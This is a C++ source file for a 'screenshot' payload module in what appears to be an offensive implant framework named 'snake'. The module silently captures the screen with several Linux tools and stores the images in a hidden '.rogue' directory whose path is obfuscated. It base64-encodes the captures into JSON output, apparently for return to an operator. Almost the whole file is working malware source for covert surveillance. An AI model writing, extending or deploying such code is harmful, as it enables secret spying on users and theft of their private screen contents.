#include <sys/stat.h>
#include <unistd.h>

#include <cstdio>

#include "snake/crypto.hpp"
#include "snake/payloads.hpp"
#include "snake/stealth.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

std::string local_stamp() {
    std::time_t t = std::time(nullptr);
    std::tm tmv{};
    localtime_r(&t, &tmv);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%Y%m%d_%H%M%S", &tmv);
    return buf;
}

std::string temp_dir() {
    const char* keys[] = {"TMPDIR", "TEMP", "TMP"};
    for (const char* k : keys) {
        const char* v = getenv(k);
        if (v != nullptr && *v != '\0') return v;
    }
    return "/tmp";
}

bool file_stat(const std::string& path, int64_t& size) {
    struct stat st;
    if (::stat(path.c_str(), &st) != 0) return false;
    size = (int64_t)st.st_size;
    return true;
}

class Screenshot : public Payload {
  public:
    const char* name() const override { return "screenshot"; }
    const char* category() const override { return "collection"; }
    const char* description() const override {
        return "Capture screen using import/xwd (Linux) or platform-specific tools";
    }

    Output execute(const Args&) const override {
        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();

        std::string output_dir = temp_dir() + SNAKE_OBF("/.rogue/screenshots");
        ::mkdir((temp_dir() + "/.rogue").c_str(), 0700);
        ::mkdir(output_dir.c_str(), 0700);
        std::string path = output_dir + "/screenshot_" + local_stamp() + ".png";

        std::string method;

        std::string imp = which_exe("import");
        if (!imp.empty()) {
            method = "import (ImageMagick)";
            CmdResult c = run_cmd_out({imp, "-window", "root", path});
            if (c.ok) return finalize(r, method, path);
        }

        std::string xwd = which_exe("xwd");
        if (!xwd.empty()) {
            std::string xwd_file = path + ".xwd";
            CmdResult c = run_cmd_out({xwd, "-root", "-out", xwd_file});
            if (c.ok) {
                std::string convert = which_exe("convert");
                if (!convert.empty()) {
                    run_cmd_out({convert, xwd_file, path});
                    ::remove(xwd_file.c_str());
                    int64_t sz = 0;
                    if (file_stat(path, sz)) {
                        method = "xwd+convert";
                        return finalize(r, method, path);
                    }
                }
                method = "xwd";
                return finalize(r, method, xwd_file);
            }
        }

        std::string scrot = which_exe("scrot");
        if (!scrot.empty()) {
            CmdResult c = run_cmd_out({scrot, path, "-z"});
            if (c.ok) {
                method = "scrot";
                return finalize(r, method, path);
            }
        }

        std::string gnome = which_exe("gnome-screenshot");
        if (!gnome.empty()) {
            CmdResult c = run_cmd_out({gnome, "-f", path});
            if (c.ok) {
                method = "gnome-screenshot";
                return finalize(r, method, path);
            }
        }

        r["method"] = method;
        r["filepath"] = "";
        r["size_bytes"] = 0;
        r["error"] = "No screen capture tool found (try: import, xwd, scrot, gnome-screenshot)";
        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }

  private:
    Output finalize(OJ r, const std::string& method, const std::string& path) const {
        int64_t size = 0;
        bool have = file_stat(path, size);

        r["method"] = method;
        r["filepath"] = have ? path : std::string();
        r["size_bytes"] = have ? size : 0;

        if (have && size > 0 && size < 1024 * 1024) {
            std::string data;
            if (read_file(path, data)) {
                Bytes b(data.begin(), data.end());
                r["base64"] = to_b64(b);
            }
        }

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

Screenshot g_screenshot;

struct Reg { Reg() { Register(&g_screenshot); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
